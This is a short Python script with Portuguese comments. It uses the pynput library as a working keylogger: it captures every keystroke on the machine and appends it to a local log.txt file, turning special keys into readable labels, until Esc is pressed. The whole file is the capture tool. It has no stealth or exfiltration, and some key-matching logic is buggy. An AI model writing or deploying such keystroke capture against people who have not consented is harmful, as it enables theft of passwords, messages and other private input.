import pynput

from pynput.keyboard import Key, Listener

count = 0
keys =[]

def on_press(key): # responsavel capturar a tecla e chamar a função de escrita (write_file)
    global keys,count
    keys.append(key)
    count +=1

    if count >= 2: #otimização boba
        count = 0
        write_file(keys)
        keys=[]
def write_file(keys): #cria log.txt no diretorio desejado ( default = mesma pagina do projeto do arquivo)
    with open("log.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")  # Deixa o log mais bonito
            if k.find("space") > 0: # Deixa o log mais bonito
                f.write(' ')
            if k.find("enter") > 0: # Deixa o log mais bonito
                f.write('\n')
            if k.find("backspace") > 0:  # Deixa o log mais bonito
                f.write('"Apagou"')
                
            if k.find("up")> 0:
                f.write("'Cima'")
            if k.find("down") > 0:
                f.write("'baixo'")
            if k.find("left")> 0:
                f.write("'esquerda'")
            if k.find("right")> 0:
                f.write("'direita'")
                
            if k.find("tab") > 0:
                f.write("tab")
            if k.find("caps_lock") > 0:
                f.write("'Caps Lock'")
            if k.find("scroll_lock") > 0:
                f.write("'Scroll Lock'")
            if k.find("num_lock") > 0:
                f.write("'Num Lock'")
            if k.find("shift") > 0:
                f.write("'Shift'") #shift_r ou shfit para especificar o shift
            if k.find("ctrl") > 0:#crtl_r ou crtl_l para especificar o ctrl
                f.write("'ctrl'")
            if k.find("alt") > 0:
                f.write("'Alt'")
            if k.find("print_screen") > 0:
                f.write("'Print Screen'")
            if k.find("delete") > 0:
                f.write("'Delete'")
            if k.find("insert") > 0:
                f.write("'Insert'")



            if k.find("f1") > 0:
                f.write("'F1'")
            if k.find("f2") > 0:
                f.write("'F2'")
            if k.find("f3") > 0:
                f.write("'F3'")
            if k.find("f4") > 0:
                f.write("'F4'")
            if k.find("f5") > 0:
                f.write("'F5'")
            if k.find("f6") > 0:
                f.write("'F6'")
            if k.find("f7") > 0:
                f.write("'F7'")
            if k.find("f8") > 0:
                f.write("'F8'")
            if k.find("f9") > 0:
                f.write("'F9'")
            if k.find("f10") > 0:
                f.write("'F10'")
            if k.find("f11") > 0:
                f.write("'F11'")
            if k.find("f12") > 0:
                f.write("'F12'")

            elif k.find("Key") == -1:
                f.write(k)

def on_release(key): # condição para fechar o programa
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release = on_release) as Listener: # responsavel por "monitorar" informações digitadas
    Listener.join()
